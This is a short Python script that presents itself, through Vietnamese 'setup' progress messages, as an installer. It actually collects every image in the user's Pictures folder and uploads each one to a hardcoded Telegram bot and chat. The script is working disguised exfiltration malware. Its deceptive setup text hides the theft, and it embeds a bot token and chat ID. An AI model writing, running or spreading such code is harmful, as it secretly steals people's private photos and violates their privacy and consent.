import os
import requests
import sys


print("Vui lòng chờ setup(30s-1p)")


TELEGRAM_BOT_TOKEN = '8084179466:AAGMcuWF5-XN5WWz5TNiUKoX7L0FajBVpo0'
TELEGRAM_CHAT_ID = '-1002423518524'


def send_image_to_telegram(image_path, count):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    files = {'photo': open(image_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    try:
        requests.post(url, files=files, data=data)
        print(f"Đã setup hoàn thành lần {count}")
    except Exception as e:
        pass  


def get_images_from_directory(directory):
    
    image_extensions = ('.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff')

    image_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(image_extensions):  
                image_files.append(os.path.join(root, file))
    return image_files

def get_default_image_directory():
    if sys.platform.startswith('win'):
        
        return os.path.join(os.environ['USERPROFILE'], 'Pictures')
    elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
        
        return os.path.join(os.environ['HOME'], 'Pictures')
    else:
        return None

# Hàm chính để lấy ảnh và gửi qua Telegram
def main():
    # Lấy thư mục ảnh mặc định
    directory = get_default_image_directory()
    
    if directory and os.path.exists(directory):
       
        images = get_images_from_directory(directory)
        
        if images:
            count = 1  # Bắt đầu đếm từ 1
            for image in images:
                send_image_to_telegram(image, count)  # Gửi từng ảnh qua Telegram và in số lần
                count += 1  # Tăng số lần sau mỗi lần gửi

if __name__ == "__main__":
    main()
